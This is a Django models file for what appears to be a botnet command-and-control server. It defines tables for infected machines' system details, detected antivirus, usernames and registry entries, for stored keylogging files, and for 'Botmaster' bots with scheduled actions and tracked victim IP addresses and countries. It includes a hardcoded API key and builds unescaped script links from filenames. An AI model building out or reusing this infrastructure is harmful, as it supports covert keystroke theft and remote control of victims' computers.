from django.db import models

#################################### START SYSTEM INFORMATION ##

# Create your models here.
class System_Information(models.Model):
	mac_address = models.CharField(max_length=20, unique=True, primary_key=True)
	op_system = models.CharField(max_length=30, default='None')
	cpu = models.CharField(max_length=20, default='None')
	created = models.DateTimeField(auto_now_add=True, null=True)
	connection_allowed = models.BooleanField(default=True)
	class Meta:
		verbose_name = 'Information - System Information'
		verbose_name_plural = 'Information    - System Information'

	def __str__(self):
		return self.mac_address

class Antivirus(models.Model):
	mac_address = models.ForeignKey(System_Information)
	antivirus_detected = models.CharField(max_length=40)
	class Meta:
		verbose_name = 'Information - Antivirus'
		verbose_name_plural = 'Information   - Antiviruses'

	def __str__(self):
		return self.antivirus_detected

class Registry(models.Model):
	mac_address = models.ForeignKey(System_Information)
	registry = models.CharField(max_length=40)
	class Meta:
		verbose_name = 'Information - Registry'
		verbose_name_plural = 'Information   - Registries'

	def __str__(self):
		return self.registry

class User(models.Model):
	mac_address = models.ForeignKey(System_Information)
	username = models.CharField(max_length=40)
	class Meta:
		verbose_name = 'Information - Username'
		verbose_name_plural = 'Information    - Usernames'

	def __str__(self):
		return self.username

class Keylogging(models.Model):
	mac_address = models.ForeignKey(System_Information)
	filename = models.CharField(max_length=20)
	timestamp = models.DateTimeField(auto_now_add=True)

	class Meta:
		verbose_name = 'Information - Keylogging File'
		verbose_name_plural = 'Information  - Keylogging Files'

	def file_link(self):
		return ("<script>function test(){var win = window.open('/database/api/get_file?filename="+self.filename+"&mac_address="+str(self.mac_address)+"&key=H4G9A79B', 'test'); win.focus();}</script><a href='#' id='link' onclick='test()'>"+self.filename+".txt</a>")

	file_link.allow_tags = True

	def __str__(self):
		return self.filename

################################## END SYSTEM INFORMATION ######
 
################################## STUFF FOR BOTS  #############
class Bot(models.Model):
	bot_id = models.CharField(max_length=40)
	created = models.DateTimeField(auto_now_add=True)
	connection_count = models.IntegerField(default=0)
	connection_allowed = models.BooleanField(default=True)

	class Meta:
		verbose_name = 'Botmaster - Bot'
		verbose_name_plural = ' Botmaster - Bots'

	def __str__(self):
		return self.bot_id

class Action(models.Model):
	action = models.CharField(max_length=40)
	enabled = models.BooleanField(default=True)
	frequency = models.CharField(max_length=40, choices=[('Once','Once'),('Anytime','Anytime'),('Hourly','Hourly'),('Daily','Daily'),('Weekly','Weekly'),('Biweekly','Biweekly'),('Monthly','Monthly'),('Quarterly','Quarterly'),('Bianually','Bianually'),('Yearly','Yearly')], default='Anytime')

	class Meta:
		verbose_name = 'Botmaster - Action'
		verbose_name_plural = ' Botmaster - Actions'

	def __str__(self):
		return str(self.action) + str("  (")  +str(self.frequency) + str(")")

class Bot_Action(models.Model):
	bot_id = models.ForeignKey(Bot)
	action = models.ForeignKey(Action)
	enabled = models.BooleanField(default=True)
	action_count = models.IntegerField(default=0)
	last_performed = models.DateTimeField(auto_now=True)

	class Meta:
		verbose_name = 'Botmaster - Bot Action'
		verbose_name_plural = 'Botmaster - Bot Actions'

##################################  END BOT STUFF  ##############

class Connection(models.Model):
	bot_id = models.ForeignKey(Bot)
	mac_address = models.ForeignKey(System_Information)
	ip_address = models.CharField(max_length=20)
	connection_type = models.CharField(max_length=60, default='NA')
	timestamp = models.DateTimeField(auto_now_add=True)

	class Meta:
		verbose_name = 'Information - Connection'
		verbose_name_plural = 'Information - Connections'

	def __str__(self):
		return self.ip_address

class Location(models.Model):
	ip_address = models.ForeignKey(Connection)
	country = models.CharField(max_length=5)

	class Meta:
		verbose_name = 'Information - Location'
		verbose_name_plural = 'Information - Locations'

	def __str__(self):
		return self.country